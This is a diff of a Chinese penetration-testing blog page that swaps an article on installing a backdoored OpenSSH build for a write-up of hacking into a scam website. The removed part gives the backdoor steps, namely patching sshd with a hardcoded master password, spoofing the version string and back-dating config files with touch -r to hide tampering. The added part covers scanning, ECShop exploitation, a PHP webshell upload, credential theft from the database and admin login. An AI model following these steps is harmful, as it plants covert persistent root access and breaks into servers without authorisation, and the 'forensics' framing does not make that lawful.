@@ -15,11 +15,11 @@
     <script async defer src="https://buttons.github.io/buttons.js"></script>
     <title>
         
-          SSH后门安装 - 明心 | Blog
+          诈骗网站渗透取证 - 明心 | Blog
         
     </title>
 
-    <link rel="canonical" href="http://www.mingxin.live/article/SSH后门安装/">
+    <link rel="canonical" href="http://www.mingxin.live/article/诈骗网站渗透取证/">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -72,7 +72,7 @@
 <style type="text/css">
     header.intro-header{
         
-            background-image: url('/img/article_header/2.jpg')
+            background-image: url('/img/article_header/8.jpg')
             /*post*/
         
     }
@@ -96,11 +96,11 @@
                               <a class="tag" href="/tags/#渗透测试" title="渗透测试">渗透测试</a>
                             
                         </div>
-                        <h1>SSH后门安装</h1>
-                        <h2 class="subheading">通过实践学习熟悉Linux SSH后门的安装过程和步骤</h2>
+                        <h1>诈骗网站渗透取证</h1>
+                        <h2 class="subheading">通过实战诈骗网站渗透的案例，增强实战经验</h2>
                         <span class="meta">
                             Posted by 明心 on
-                            2019-04-28
+                            2019-05-07
                         </span>
                     </div>
                 
@@ -217,63 +217,56 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <h1 id="ssh后门安装">SSH后门安装</h1>
+                <h1 id="诈骗网站渗透取证">诈骗网站渗透取证</h1>
 <h2 id="一前言">一：前言</h2>
-<p>通过WinSCP与Linux服务器进行连接，然后配置安装SSH后门，这次实验主要目的通过实践学习熟悉Linux SSH后门的安装过程和步骤。</p>
-<h2 id="二配置ssh后门">二：配置SSH后门</h2>
-<h3 id="21建立连接">2.1：建立连接</h3>
-<p>利用winSCP工具（也可以选用其他工具）连接已知（即已经渗透成功的服务器）服务器，如图：</p>
-<p><img src="//mingxin.live/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/1.jpg" alt=""></p>
-<p>连接成功后：</p>
-<p><img src="//mingxin.live/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/2.jpg" alt=""></p>
-<p>用SecureCRT连接成功后如图：</p>
-<p><img src="//mingxin.live/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/3.jpg" alt=""></p>
-<p>通过<code>ssh -V</code>查看当前SSH版本</p>
-<p><strong>上传带有后门的SSH安装包</strong></p>
-<p>上传工具（上面提到的WinSCP、SecureCRT、putty都可以，自行选择）</p>
-<p><img src="//mingxin.live/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/4.jpg" alt=""></p>
-<p><strong>解压上传的安装包</strong></p>
-<p>tar zxf openssh-5.9p1.tar.gz</p>
-<p>tar zxf 0x06-openssh-5.9p1.patch.tar.gz</p>
-<p><img src="//mingxin.live/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/5.jpg" alt=""></p>
-<p><strong>执行如下命令，移动原有配置文件</strong></p>
-<hr>
-<p>mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old</p>
-<p>mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old</p>
-<hr>
-<p><strong>复制文件sshbd5.9p1.diff到openssh-5.9p1目录</strong></p>
-<hr>
-<p>cd openssh-5.9p1.patch/</p>
-<p>cp sshbd5.9p1.diff …/openssh-5.9p1</p>
-<p>cd …/openssh-5.9p1</p>
-<p>patch &lt; sshbd5.9p1.diff</p>
-<hr>
-<p><img src="//mingxin.live/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/6.jpg" alt=""></p>
-<p><strong>编辑includes.h文件，设置自己的后门密码</strong></p>
-<hr>
-<p>vi includes.h</p>
-<p>找到#define SECRETPW “apaajaboleh”   // apaajaboleh为后门的密码 可修改成自己设定的密码，如图</p>
-<p><img src="//mingxin.live/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/7.jpg" alt=""></p>
-<hr>
-<p><strong>修改当前系统的SSH版本</strong></p>
-<hr>
-<p>通过<code>ssh -V</code>查看当前SSH版本，记录下来</p>
-<p>vi version.h  修改version.h文件的版本信息</p>
-<p><img src="//mingxin.live/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/8.jpg" alt="8"></p>
-<hr>
-<h2 id="三安装ssh后门">三：安装SSH后门</h2>
-<hr>
-<p>执行./configure --prefix=/usr --sysconfdir=/etc/ssh指定配置选项</p>
-<p>执行make &amp;&amp; make install 编译安装</p>
-<p><strong>安转完成后如图：</strong></p>
-<p><img src="//mingxin.live/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/9.jpg" alt=""></p>
-<p>touch -r  /etc/ssh/ssh_config.old /etc/ssh/ssh_config //修改日期</p>
-<p>touch -r  /etc/ssh/sshd_config.old /etc/ssh/sshd_config //修改日期</p>
-<p>/etc/init.d/ssh restart     //重启ssh服务</p>
-<hr>
-<h2 id="四测试后门是否安装成功">四：测试后门是否安装成功</h2>
-<p>用连接工具连接，用户名为root，密码为前面设置的SSH后门的密码</p>
-<p><img src="//mingxin.live/img/SSH%E5%90%8E%E9%97%A8%E5%AE%89%E8%A3%85/10.jpg" alt=""></p>
+<p>通过实战诈骗网站渗透的案例，增强实战经验</p>
+<p>这次实战攻占诈骗网站，进行信息收集，扫描端口发现对方可利用的端口中只开放了80端口，所以只能通过80端口渗透目标主机</p>
+<h2 id="二渗透过程">二：渗透过程</h2>
+<h3 id="1信息搜集">1：信息搜集</h3>
+<p>nmap对目标主机进行扫描，扫描结果如下：</p>
+<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/1.jpg" alt=""></p>
+<p>可以看到目标主机只有80端口开放，因此只能从80端口渗透目标主机，访问目标服务器的80端口，显示界面如下：</p>
+<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/2.jpg" alt=""></p>
+<p>界面做的很仿真，通过浏览网站，发现网站的大多功能都的跳转到真实的网站地址，只有这个红色的<font color="red"><code>专案执行令</code> </font> 不会跳转到其他服务器，点击<font color="red"><code>专案执行令</code> </font> 进入页面：</p>
+<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/4.jpg" alt=""></p>
+<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/5.jpg" alt=""></p>
+<p>可以看到页面有一个表单，提示输入<code>专案验证码</code> 和 <code>涉案嫌疑人证号</code> ，可以知悉其存储了受害人的信息，左上角有一个<code>网上安全监控软件-犯罪追查系统</code>，点击自动开始下载<code>TeamView</code>远程监控软件，目的是通过诱骗等等方式控制受害人电脑进行远程转帐等操作</p>
+<p><strong>分析：</strong></p>
+<p>这里在前台可以在该表单查询受害人信息，那么一定有个后台用于管理受害人信息，执行增删检查操作</p>
+<p>进行敏感目录扫描：</p>
+<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/6.jpg" alt=""></p>
+<p>看到<code>admin</code>眼前一亮，在原目标域名后添加<code>/admin</code>访问之，网页自动跳转到其后台登陆界面：</p>
+<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/7.jpg" alt=""></p>
+<p>可以看到该后台使用的是<code>ECShop CMS</code>系统，右键查看源代码，点击这个JS连接<code>js/validator.js</code>：</p>
+<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/8.jpg" alt=""></p>
+<p>可以看到该CMS确实是ECShop，并且版本可能为1.1</p>
+<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/9.jpg" alt=""></p>
+<p>确定其CMS有什么用呢？一般的思路如下：</p>
+<ul>
+<li>Google找到其对应版本的已知漏洞或exp，进行利用</li>
+<li>下载其CMS源码，审计或者分析源码</li>
+</ul>
+<p>在网上找了半天没有找到ECShop 有V1.1版本，大多数都为V2.7.3版本，下载解压后，进入程序目录<code>upload</code> 可以看到<code>api</code> 目录，在域名后跟<code>api</code> 访问之后发现，网站直接把目录里的文件显示出来了</p>
+<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/10.jpg" alt=""></p>
+<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/11.jpg" alt=""></p>
+<p>看到这里就方便很多了，说明该CMS的确为ECShop ，而且很可能就是V2.7.3版本</p>
+<p>找到对应的CMS，即可按图索骥，寻找合适的exp，下面的网址都有对应的EXP修改后自行利用即可</p>
+<ul>
+<li><a href="http://paper.tuisec.win/detail/ab2df26cb395c70" target="_blank" rel="noopener">http://paper.tuisec.win/detail/ab2df26cb395c70</a></li>
+<li><a href="http://paper.tuisec.win/detail/5f427506f4635da" target="_blank" rel="noopener">http://paper.tuisec.win/detail/5f427506f4635da</a></li>
+<li><a href="https://www.cnblogs.com/68xi/p/9327620.html" target="_blank" rel="noopener">https://www.cnblogs.com/68xi/p/9327620.html</a></li>
+</ul>
+<p>利用EXP上传一句话木马，这里是在api目录下上传的<code>gooos.php</code> 使用菜刀连接</p>
+<p>找到数据库的配置文件，查看数据库用户名和密码：</p>
+<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/12.jpg" alt=""></p>
+<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/13.jpg" alt=""></p>
+<p>得到数据库的帐号密码之后进入数据库查看后台信息，查看管理员信息表如图：</p>
+<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/14.jpg" alt=""></p>
+<p>在线CMD 5查询了admin2的密码，查询结果为：admin88888</p>
+<p>（为什么不查admin，因为要购买，没钱）</p>
+<p>直接在之前找到的后台地址登陆，用户名为<code>admin2</code> ，密码为<code>admin88888</code></p>
+<p>登陆之后，查看“犯罪通缉人列表”（受害者列表），受害者有上千人，渗透到此，取证完毕~</p>
+<p><img src="//mingxin.live/img/%E8%AF%88%E9%AA%97%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/15.jpg" alt=""></p>
 
                 
 
@@ -281,10 +274,10 @@
                 <!-- Pager -->
                 <ul class="pager">
                     
-                        <li class="previous">
-                            <a href="/article/信息搜集之谷歌语法/" data-toggle="tooltip" data-placement="top" title="信息搜集之谷歌语法">&larr; Previous Post</a>
-                        </li>
                     
+                        <li class="next">
+                            <a href="/article/Struts2-016命令执行漏洞/" data-toggle="tooltip" data-placement="top" title="Struts2-016命令执行漏洞">Next Post &rarr;</a>
+                        </li>
                     
                 </ul>
 
@@ -333,7 +326,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#ssh后门安装"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">SSH&#x540E;&#x95E8;&#x5B89;&#x88C5;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#一前言"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">&#x4E00;&#xFF1A;&#x524D;&#x8A00;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#二配置ssh后门"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">&#x4E8C;&#xFF1A;&#x914D;&#x7F6E;SSH&#x540E;&#x95E8;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#21建立连接"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">2.1&#xFF1A;&#x5EFA;&#x7ACB;&#x8FDE;&#x63A5;</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#三安装ssh后门"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">&#x4E09;&#xFF1A;&#x5B89;&#x88C5;SSH&#x540E;&#x95E8;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#四测试后门是否安装成功"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">&#x56DB;&#xFF1A;&#x6D4B;&#x8BD5;&#x540E;&#x95E8;&#x662F;&#x5426;&#x5B89;&#x88C5;&#x6210;&#x529F;</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#诈骗网站渗透取证"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">&#x8BC8;&#x9A97;&#x7F51;&#x7AD9;&#x6E17;&#x900F;&#x53D6;&#x8BC1;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#一前言"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">&#x4E00;&#xFF1A;&#x524D;&#x8A00;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#二渗透过程"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">&#x4E8C;&#xFF1A;&#x6E17;&#x900F;&#x8FC7;&#x7A0B;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#1信息搜集"><span class="toc-nav-number">1.2.1.</span> <span class="toc-nav-text">1&#xFF1A;&#x4FE1;&#x606F;&#x641C;&#x96C6;</span></a></li></ol></li></ol></li></ol>
         
         </div>
       </aside>
